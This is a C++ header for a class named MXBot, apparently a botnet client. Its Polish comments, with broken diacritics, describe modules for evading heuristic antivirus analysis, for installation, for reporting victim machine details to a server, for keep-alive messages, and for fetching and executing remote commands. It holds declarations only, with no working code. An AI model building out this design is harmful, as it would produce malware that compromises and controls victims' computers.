#pragma once
#include "stdafx.h"
class MXBot
{
public:
	MXBot();
	~MXBot();
	
	void BypassModule();// W��cza modu� omijaj�cy analizy heurystyczne
	void ActivateInstallationModule();// W��cza modu� instalacyjny	
	void SendPayloadOfTheDay();// Wy�lij payload of the day -> informacje o maszynie, wersji bota oraz jego id
	void SendKeepAlive();// Wysy�a wiadomo�� typu Keep-Alive
	void CheckCommandsAndMakeThem();// Sprawdza obecno�� rozkaz�w na serwerze i wykonuje je, je�li istniej�
#ifdef DMODE
	void WriteVictimMachineInfoToConsole();// Wypisuje informacje o maszynie ofiary na ekran
#endif
};

